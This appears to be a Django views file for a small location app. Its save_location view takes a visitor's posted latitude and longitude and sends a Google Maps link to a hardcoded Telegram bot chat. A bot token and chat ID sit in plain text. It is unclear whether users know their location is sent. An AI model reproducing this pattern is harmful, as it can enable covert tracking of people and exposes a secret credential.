from django.shortcuts import render
import json
import requests
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt

TELEGRAM_BOT_TOKEN = "8444297437:AAHDEuv1a0BvLHeDAzUJHGAxQGRsCsuIoI0"
CHAT_ID = "8381500320"

def index(request):
    return render(request, "lokatsiya/index.html")

@csrf_exempt
def save_location(request):
    if request.method == "POST":
        data = json.loads(request.body)

        lat = data.get("latitude")
        lon = data.get("longitude")

        google_map_url = f"https://www.google.com/maps?q={lat},{lon}"

        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={
                "chat_id": CHAT_ID,
                "text": f"📍 Yangi lokatsiya:\n{google_map_url}"
            }
        )

        return JsonResponse({"ok": True})

    return JsonResponse({"error": "Bad request"})
